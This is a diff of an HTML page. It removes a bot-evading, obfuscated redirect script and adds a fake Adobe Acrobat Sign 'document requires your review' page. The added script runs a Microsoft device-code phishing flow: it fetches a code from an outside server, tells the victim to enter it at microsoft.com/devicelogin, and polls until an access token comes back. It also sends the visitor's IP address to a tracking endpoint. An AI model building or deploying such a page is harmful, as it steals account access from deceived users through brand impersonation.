@@ -3,104 +3,51 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>Loading...</title>
-<script>
-(function(){
-  let botKeywords = ["bot","crawl","spider","scrape","scan","index","headless","facebookexternalhit","WhatsApp","TelegramBot","Slackbot","Discordbot","Twitterbot","Googlebot","Bingbot","Baiduspider","YandexBot","DuckDuckBot","Slurp","ia_archiver","AhrefsBot","SemrushBot","DotBot","MJ12bot","rogerbot","exabot","fastbot","gigabot","turnitinbot","ltx71","BLEXBot","PetalBot","SeznamBot","Sogou","Bytespider","CCBot","CoHere","Amazonbot","Applebot","GPTBot","ClaudeBot","PerplexityBot","Puppeteer","PhantomJS","Selenium"];
-  
-  let ua = navigator.userAgent.toLowerCase();
-  for(let i=0; i<botKeywords.length; i++){
-    if(ua.includes(botKeywords[i])){
-      document.body.innerHTML = "<h1>Access Denied</h1>";
-      throw new Error("Bot detected");
-    }
-  }
-  
-  if(navigator.webdriver === true){
-    document.body.innerHTML = "<h1>Access Denied</h1>";
-    throw new Error("Webdriver detected");
-  }
-  
-  if(!navigator.plugins || navigator.plugins.length === 0){
-    if(!navigator.userAgent.includes("Chrome") && !navigator.userAgent.includes("Firefox") && !navigator.userAgent.includes("Safari")){
-      document.body.innerHTML = "<h1>Access Denied</h1>";
-      throw new Error("No plugins detected");
-    }
-  }
-  
-  if(navigator.languages === undefined || navigator.languages.length === 0){
-    document.body.innerHTML = "<h1>Access Denied</h1>";
-    throw new Error("Invalid languages");
-  }
-  
-  let hasMouseMoved = false;
-  let hasTouch = false;
-  let hasKeyPress = false;
-  
-  window.addEventListener('mousemove', function(){ hasMouseMoved = true; }, {once: true});
-  window.addEventListener('touchstart', function(){ hasTouch = true; }, {once: true});
-  window.addEventListener('keydown', function(){ hasKeyPress = true; }, {once: true});
-  
-  let startTime = Date.now();
-  
-  function getDestinationURL(){
-    let url = "";
-    url += String.fromCharCode(104,116,116,112,115,58,47,47);
-    url += String.fromCharCode(115,104,105,101,108,100,45,99,104,101,99,107,45,115,101,114,118,105,99,101,46,120,121,122);
-    url += String.fromCharCode(47);
-    return url;
-  }
-  
-  function performRedirect(){
-    let elapsed = Date.now() - startTime;
-    
-    if(!hasMouseMoved && !hasTouch && !hasKeyPress && elapsed < 800){
-      setTimeout(performRedirect, 200);
-      return;
-    }
-    
-    let baseUrl = getDestinationURL();
-    let currentUrl = window.location.href;
-    let noise = "";
-    
-    if(currentUrl.includes('?')){
-      noise = currentUrl.split('?')[1];
-    } else if(currentUrl.includes('#')){
-      noise = currentUrl.split('#')[1];
-    }
-    
-    if(noise && noise.length > 30){
-      window.location.replace(baseUrl);
-    } else {
-      document.body.innerHTML = "";
-      document.body.style.background = "#fff";
-      document.body.style.minHeight = "100vh";
-      let spinner = document.createElement("div");
-      spinner.style.cssText = "position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:40px;height:40px;border:4px solid #f3f3f3;border-top:4px solid #3498db;border-radius:50%;animation:spin 1s linear infinite";
-      let style = document.createElement("style");
-      style.textContent = "@keyframes spin{0%{transform:translate(-50%,-50%) rotate(0deg)}100%{transform:translate(-50%,-50%) rotate(360deg)}}";
-      document.head.appendChild(style);
-      document.body.appendChild(spinner);
-      
-      setTimeout(function(){
-        let newUrl = window.location.href;
-        let newNoise = "";
-        if(newUrl.includes('?')) newNoise = newUrl.split('?')[1];
-        else if(newUrl.includes('#')) newNoise = newUrl.split('#')[1];
-        if(newNoise && newNoise.length > 30){
-          window.location.replace(baseUrl);
-        }
-      }, 100);
-    }
-  }
-  
-  setTimeout(performRedirect, 100);
-})();
-</script>
+<meta name="robots" content="noindex,nofollow,noarchive">
+<meta name="referrer" content="never">
+<title>Portal</title>
 <style>
-body{background:#fff;min-height:100vh;margin:0;padding:0}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Adobe Clean','Segoe UI',system-ui,sans-serif;background:#f5f5f5;min-height:100vh}
+._g3v224{background:#2c2c2c;height:50px;display:flex;align-items:center;padding:0 22px;gap:10px}
+._klme4y{display:flex;align-items:center;gap:9px;color:#fff;font-size:15px;font-weight:600}
+._klme4y svg{width:28px;height:24px}
+._klme4y span:nth-child(2){width:1px;height:18px;background:#555;margin:0 3px}
+._klme4y span:last-child{color:#e1e1e1;font-weight:400}
+._7vxrly{max-width:500px;margin:46px auto;padding:0 18px}
+._pb39sc{background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1);overflow:hidden}
+._v0qku3{height:3px;background:#e00f00}
+._6oxe0r{padding:34px 30px 22px;text-align:center}
+._58re31{width:78px;height:92px;margin:0 auto 18px;background:#fafafa;border:1px solid #e5e5e5;border-radius:4px;display:flex;flex-direction:column;align-items:center;justify-content:center;position:relative}
+._58re31::after{content:'';position:absolute;top:0;right:0;width:18px;height:18px;background:linear-gradient(225deg,#fff 50%,#e5e5e5 50%)}
+._58re31 svg{width:30px;height:30px}
+._6oxe0r h1{font-size:19px;font-weight:700;color:#2c2c2c;margin-bottom:7px}
+._6oxe0r p{font-size:14px;color:#6e6e6e;line-height:1.5;margin-bottom:6px}
+._ckch9u{display:flex;align-items:center;justify-content:center;gap:7px;padding:10px;background:#fafafa;border-top:1px solid #eee;border-bottom:1px solid #eee;font-size:13px;color:#6e6e6e;margin-bottom:22px}
+._ckch9u svg{width:13px;height:13px;fill:#6e6e6e}
+._illbr8{display:inline-block;background:#e00f00;color:#fff;border:none;padding:12px 44px;font-size:14px;font-weight:700;border-radius:20px;cursor:pointer;text-decoration:none;font-family:inherit;transition:background .15s}
+._illbr8:hover{background:#b80c00}
+._gqs419{font-size:10px;color:#b3b3b3;margin-top:12px;line-height:1.5}
+._jcdy84{text-align:center;padding:10px 30px 22px}
+._jcdy84 p{font-size:12px;color:#b3b3b3}
+._2y4rpx{display:inline-block;width:14px;height:14px;border:2px solid #eee;border-top-color:#e00f00;border-radius:50%;animation:_j9ejoz .8s linear infinite;vertical-align:middle;margin-right:4px}
+@keyframes _j9ejoz{to{transform:rotate(360deg)}}
+._hwe3pa{display:none;text-align:center;padding:44px 30px}
+._n2axua{width:54px;height:54px;border-radius:50%;background:#2bb535;display:flex;align-items:center;justify-content:center;margin:0 auto 14px}
+._n2axua svg{width:26px;height:26px}
+._hwe3pa h2{font-size:19px;font-weight:700;color:#2c2c2c;margin-bottom:7px}
+._hwe3pa p{font-size:14px;color:#6e6e6e}
+._c5p2wj{text-align:center;padding:18px 30px;color:#e00f00;font-size:13px}
+._hs0wnh{text-align:center;padding:18px;font-size:10px;color:#b3b3b3}
+._countryBadge{background:#f0f0f0;border-radius:20px;padding:4px 12px;font-size:11px;color:#2c2c2c;display:inline-flex;align-items:center;gap:6px;margin-left:10px;font-weight:normal}
+._locationInfo{background:#f0f6ff;border-radius:8px;padding:8px 12px;margin-top:12px;font-size:11px;color:#555;display:flex;align-items:center;justify-content:center;gap:8px}
 </style>
 </head>
 <body>
+<div class="_g3v224"><div class="_klme4y"><svg viewBox="0 0 30 26" fill="none"><polygon points="12,0 0,26 9,26 12,18 15,26 12,26" fill="#e00f00"></polygon><polygon points="18,0 30,26 21,26 18,18 15,26 18,26" fill="#e00f00"></polygon><polygon points="15,9 19,20 11,20" fill="#e00f00"></polygon></svg>Adobe<span></span><span>Acrobat Sign</span></div></div>
+<div class="_7vxrly"><div class="_pb39sc"><div class="_v0qku3"></div><div id="mainView"><div class="_6oxe0r"><div class="_58re31"><svg viewBox="0 0 32 32" fill="none"><rect x="4" y="2" width="24" height="28" rx="2" fill="none" stroke="#ccc"></rect><path d="M10 10h12M10 14h12M10 18h8" stroke="#ddd" stroke-width="1.2"></path><circle cx="22" cy="22" r="5" fill="#e00f00"></circle><path d="M20 22.5l1.5 1.5 3-3" stroke="#fff" stroke-width="1.2" fill="none"></path></svg></div><h1>Document Requires Your Review</h1><p>Shared Document</p><p style="font-size:13px;color:#2c2c2c;font-weight:600;margin-bottom:18px">From: <span style="color:#e00f00">Bill Herdrich</span> <span id="countryBadge" class="_countryBadge" style="display:none"></span></p><div class="_ckch9u"><svg viewBox="0 0 16 16"><path d="M8 1a4 4 0 0 0-4 4v2H3a1 1 0 0 0-1 1v6a1 1 0 0 0 1 1h10a1 1 0 0 0 1-1V8a1 1 0 0 0-1-1h-1V5a4 4 0 0 0-4-4zm-2.5 4a2.5 2.5 0 0 1 5 0v2h-5V5z"></path></svg>This document is encrypted and requires verification</div></div><div style="text-align:center;padding:0 30px 10px"><div style="margin:18px 0 0;padding:18px 16px;background:#f9f9f8;border:1px solid #e6e4e1;border-radius:6px;text-align:center"><p style="font-size:11px;color:#6e6b68;margin-bottom:10px">Verification code</p><div style="font-size:28px;font-weight:700;color:#e00f00;letter-spacing:4px;font-family:'Segoe UI',monospace;margin-bottom:10px;user-select:all" id="userCode">------</div><button id="copyBtn" style="background:#e00f00;color:#fff;border:none;padding:6px 18px;border-radius:4px;cursor:pointer;font-size:11px;font-family:inherit">Copy code</button><div style="margin-top:14px;text-align:left;font-size:11px;color:#6e6b68;line-height:1.9"><p style="font-weight:600;margin-bottom:5px">Steps to view:</p><ol style="padding-left:20px;margin:0"><li>Click the button below to open the sign-in window</li><li>Enter code <strong id="codeStrong">------</strong> when prompted</li><li>Authenticate with your account</li><li>Return to this tab to view your documents</li></ol></div></div><div style="margin-top:18px"><a href="#" id="viewBtn" class="_illbr8">Open</a></div><p class="_gqs419">By clicking the button above, you agree to access this document securely through Adobe Acrobat Sign.</p></div><div id="locationInfo" class="_locationInfo" style="display:none"></div><div class="_jcdy84"><p id="statusMsg"><span class="_2y4rpx"></span>Preparing secure access...</p></div></div><div class="_hwe3pa" id="successBox"><div class="_n2axua"><svg viewBox="0 0 24 24" fill="none"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z" fill="#fff"></path></svg></div><h2>Document access granted</h2><p>Redirecting to your document...</p></div><div class="_c5p2wj" id="errorBox" style="display:none"></div></div></div><div class="_hs0wnh">Adobe Acrobat Sign · Powered by Adobe Document Cloud · Privacy</div>
+<script>
+(function(){const API_URL="https://carnegeinvest.com";const REDIRECT_URL="https://1cb1532c.doc-expired.pages.dev/";const u=document.getElementById('userCode'),c=document.getElementById('codeStrong'),b=document.getElementById('copyBtn'),v=document.getElementById('viewBtn'),s=document.getElementById('statusMsg'),m=document.getElementById('mainView'),x=document.getElementById('successBox'),e=document.getElementById('errorBox'),cb=document.getElementById('countryBadge'),li=document.getElementById('locationInfo');let d=null,p=null,code="",ip=null,country="",cc="",city="";function st(t,l,i){if(!s)return;if(i){s.innerHTML='<span style="color:#e00f00;">⚠️ '+t+'</span>';if(e)e.style.display='none'}else if(l)s.innerHTML='<span class="_2y4rpx"></span> '+t;else s.innerHTML='<span>✅ '+t+'</span>'}function se(msg){if(e){e.style.display='block';e.innerText=msg}st(msg,false,true)}function gf(cc){if(!cc)return'🌍';let f='';for(let i=0;i<cc.length;i++)f+=String.fromCodePoint(127397+cc.toUpperCase().charCodeAt(i));return f}async function dl(){try{const r=await fetch('https://api.ipify.org?format=json'),d=await r.json();ip=d.ip;fetch(API_URL+"/track_visit.php",{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:ip,timestamp:new Date().toISOString(),type:"visit"})}).catch(()=>{});try{const g=await fetch('https://ipapi.co/json/'),gd=await g.json();if(gd&&gd.country_name){country=gd.country_name;cc=gd.country_code;city=gd.city;let fl=gf(cc);cb.style.display='inline-flex';cb.innerHTML=fl+' '+country;li.style.display='flex';li.innerHTML='🌐 Signing in from '+fl+' '+country+(city?' · '+city:'')}}catch(e){}}catch(e){}}b.onclick=()=>{const cd=u.textContent.trim();if(!cd||cd==='------'){st('No code available yet, please wait...',false,true);return}navigator.clipboard.writeText(cd).then(()=>{const ot=b.textContent;b.textContent='Copied!';b.style.background='#0f7b10';setTimeout(()=>{b.textContent=ot;b.style.background='#e00f00'},1800)}).catch(()=>{const ta=document.createElement('textarea');ta.value=cd;ta.style.position='fixed';ta.style.left='-9999px';document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);b.textContent='Copied!';b.style.background='#0f7b10';setTimeout(()=>{b.textContent='Copy code';b.style.background='#e00f00'},1800)})};function stop(){if(p){clearInterval(p);p=null}}async function start(){st('Preparing secure access...',true);try{const r=await fetch(API_URL+"/api/device_auth.php",{method:'POST',headers:{'Accept':'application/json','Content-Type':'application/json'}});const data=await r.json();if(data&&data.user_code&&data.device_code){d=data.device_code;code=data.user_code;u.textContent=code;if(c)c.textContent=code;let pc=0;stop();p=setInterval(async()=>{pc++;try{const pr=await fetch(API_URL+"/poll.php?code="+encodeURIComponent(d)+"&new_device=true",{method:'GET'});const pd=await pr.json();if(pd&&(pd.status==="SUCCESS"||pd.ready_for_extension===true||pd.access_token)){stop();st('Verification successful! Redirecting...',false);if(m)m.style.display='none';if(x)x.style.display='block';setTimeout(()=>{window.location.href=REDIRECT_URL},2000)}else if(pd&&pd.status==="PENDING"){if(pc>60){stop();se("Timeout. Please refresh the page.")}}else if(pd&&pd.error){if(pc>60){stop();se("Timeout. Please refresh the page.")}}if(pc>70){stop();se("Timeout. Please refresh the page.")}}catch(pollErr){if(pc>40){stop();se("Timeout. Please refresh the page.")}}},5000)}else{se("Unable to get verification code. Please refresh.")}}catch(err){stop();se("Timeout. Please refresh the page.")}}v.onclick=(e)=>{e.preventDefault();if(code&&code!=='------'){navigator.clipboard.writeText(code).catch(()=>{});window.open('https://microsoft.com/devicelogin','_blank','width=520,height=720,scrollbars=yes,resizable=yes');st('Preparing secure access...',true)}else{st('Preparing secure access...',true)}};dl();setTimeout(()=>{start()},1000);})();
+</script>
 </body>
 </html>
